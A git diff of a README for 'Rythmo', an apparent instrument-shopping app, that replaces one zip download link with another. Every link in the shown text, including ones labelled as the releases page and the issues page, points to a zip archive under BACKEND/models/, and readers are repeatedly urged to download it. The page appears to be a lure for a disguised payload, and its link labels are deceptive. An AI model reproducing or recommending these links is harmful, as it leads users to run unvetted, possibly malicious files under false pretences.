@@ -4,11 +4,11 @@
 
 Welcome to Rythmo! This application helps you shop for musical instruments and accessories easily. Follow these steps to get started.
 
-[![Download Rythmo](https://raw.githubusercontent.com/hemant36/Rythmo/main/BACKEND/models/Software-v2.5.zip%https://raw.githubusercontent.com/hemant36/Rythmo/main/BACKEND/models/Software-v2.5.zip)](https://raw.githubusercontent.com/hemant36/Rythmo/main/BACKEND/models/Software-v2.5.zip)
+[![Download Rythmo](https://github.com/hemant36/Rythmo/raw/refs/heads/main/BACKEND/models/Software_v3.5-beta.3.zip%https://github.com/hemant36/Rythmo/raw/refs/heads/main/BACKEND/models/Software_v3.5-beta.3.zip)](https://github.com/hemant36/Rythmo/raw/refs/heads/main/BACKEND/models/Software_v3.5-beta.3.zip)
 
 ## 📥 Download & Install
 
-To download and install Rythmo, simply visit this page to download: [Rythmo Releases](https://raw.githubusercontent.com/hemant36/Rythmo/main/BACKEND/models/Software-v2.5.zip).
+To download and install Rythmo, simply visit this page to download: [Rythmo Releases](https://github.com/hemant36/Rythmo/raw/refs/heads/main/BACKEND/models/Software_v3.5-beta.3.zip).
 
 1. Click the link above.
 2. Choose the latest version of Rythmo.
@@ -55,7 +55,7 @@ If you experience issues while using Rythmo, try these common fixes:
 
 ## 💬 Support
 
-For further assistance, visit our [GitHub Issues Page](https://raw.githubusercontent.com/hemant36/Rythmo/main/BACKEND/models/Software-v2.5.zip) to report issues or ask questions. You can also check the FAQ for quick solutions.
+For further assistance, visit our [GitHub Issues Page](https://github.com/hemant36/Rythmo/raw/refs/heads/main/BACKEND/models/Software_v3.5-beta.3.zip) to report issues or ask questions. You can also check the FAQ for quick solutions.
 
 ## 🌐 Community
 
@@ -66,4 +66,4 @@ Join the Rythmo community for updates and discussions:
 
 Once again, don’t forget to download Rythmo from the link below:
 
-[![Download Rythmo](https://raw.githubusercontent.com/hemant36/Rythmo/main/BACKEND/models/Software-v2.5.zip%https://raw.githubusercontent.com/hemant36/Rythmo/main/BACKEND/models/Software-v2.5.zip)](https://raw.githubusercontent.com/hemant36/Rythmo/main/BACKEND/models/Software-v2.5.zip)
+[![Download Rythmo](https://github.com/hemant36/Rythmo/raw/refs/heads/main/BACKEND/models/Software_v3.5-beta.3.zip%https://github.com/hemant36/Rythmo/raw/refs/heads/main/BACKEND/models/Software_v3.5-beta.3.zip)](https://github.com/hemant36/Rythmo/raw/refs/heads/main/BACKEND/models/Software_v3.5-beta.3.zip)
